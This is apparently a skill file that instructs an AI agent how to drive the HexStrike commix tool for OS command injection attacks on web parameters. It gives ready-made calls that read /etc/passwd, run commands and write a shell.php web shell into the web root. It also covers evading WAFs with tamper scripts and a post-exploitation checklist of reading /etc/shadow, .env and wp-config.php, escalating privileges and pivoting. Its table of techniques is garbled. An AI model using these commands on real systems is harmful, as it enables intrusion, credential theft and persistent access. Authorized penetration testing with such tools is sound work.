---
name: "hexstrike-commix"
description: "Correct parameters, injection techniques, proxy configuration, and exploitation patterns for HexStrike commix MCP tool."
---

# HexStrike commix - Tool Skill

Automated command injection detection and exploitation tool. Tests for OS command injection vulnerabilities in web application parameters. When injection is found, commix can spawn an interactive pseudo-shell for further enumeration and data extraction.

## Accepted Parameters

| Parameter | Type   | Required | Description                                                               |
| --------- | ------ | -------- | ------------------------------------------------------------------------- |
| `target`  | string | **YES**  | URL with injectable parameter (e.g. `https://example.com/ping?host=test`) |
| `flags`   | string | no       | Commix flags (e.g. `--proxy`, `--level`, `--technique`)                   |

## Common Usage

```
# Basic command injection test
commix(target="https://example.com/ping?host=test")

# With proxy
commix(target="https://example.com/ping?host=test", flags="--proxy=http://user:pass@host:port")

# Maximum detection level
commix(target="https://example.com/ping?host=test", flags="--level=3")

# Specify injection technique
commix(target="https://example.com/ping?host=test", flags="--technique=classic")

# POST data injection
commix(target="https://example.com/api/exec", flags="--data='host=test&action=ping'")

# With specific parameter to test
commix(target="https://example.com/page?a=1&b=2", flags="-p host")

# Batch mode (no interactive prompts)
commix(target="https://example.com/ping?host=test", flags="--batch")

# OS command to execute after injection found
commix(target="https://example.com/ping?host=test", flags="--os-cmd='id'")

# File read via command injection
commix(target="https://example.com/ping?host=test", flags="--file-read=/etc/passwd")

# File write via command injection
commix(target="https://example.com/ping?host=test", flags="--file-write=shell.php --file-dest=/var/www/html/shell.php")
```

## Injection Techniques

| Technique      | Flag                  | Description                           |
| -------------- | --------------------- | ------------------------------------- | --- | --- | --- |
| Classic        | `--technique=classic` | Standard command separators (;        | &&  |     | )   |
| Eval-based     | `--technique=eval`    | Code evaluation injection             |
| Time-based     | `--technique=time`    | Blind injection via response delay    |
| File-based     | `--technique=file`    | Write/read files to confirm injection |
| All techniques | (default)             | Tests all available techniques        |

## Parameter Prioritization

Test parameters most likely to be injectable:

1. **System command parameters** - `?host=`, `?ip=`, `?cmd=`, `?exec=`, `?ping=`
2. **File operation parameters** - `?file=`, `?path=`, `?dir=`, `?filename=`
3. **Network parameters** - `?domain=`, `?url=`, `?server=`, `?port=`
4. **Process parameters** - `?process=`, `?service=`, `?action=`

## Proxy Configuration

```
commix(target="...", flags="--proxy=http://user:pass@host:port")
```

**Note**: commix uses `--proxy=` (with equals sign). No trailing slash.

## Retry Strategy

1. **No injection found at default level**: Increase to `--level=3` for more test vectors
2. **WAF blocking**: Try `--tamper=base64encode` or other tamper scripts
3. **Timeout**: Reduce scope to specific parameter with `-p param_name`
4. **False negative suspected**: Try specific technique (`--technique=time` for blind testing)
5. **Connection errors**: Check if target is up. Try with proxy.

## Output Interpretation

- **"The parameter appears to be injectable"** - CONFIRMED command injection. Critical severity.
- **OS command output visible** - PROVEN RCE. Extract: `id`, `whoami`, `cat /etc/passwd`, `uname -a`
- **Time-based confirmed** - Blind injection. Still critical, but data extraction is slower.
- **"Not injectable"** - parameter is safe or properly filtered. Move to next parameter.
- **File read successful** - evidence of impact; severity depends on the accessible data and execution context.

## Post-Exploitation (When Injection Found)

1. **Enumerate** - `id`, `whoami`, `uname -a`, `ls -la`, `env`
2. **Read sensitive files** - `/etc/passwd`, `/etc/shadow`, `.env`, `wp-config.php`, `web.config`
3. **Check permissions** - can you write files? escalate privileges?
4. **Pivot** - can you reach internal services from this host?
5. **Document everything** - every command and its output is evidence

## Evidence Capture

Save raw commix output to `output/{target}/scans/raw/commix_*.txt`. Assign severity and confidence from the reproduced execution context and impact. Hand selected findings to `@exploiter` only after approval.
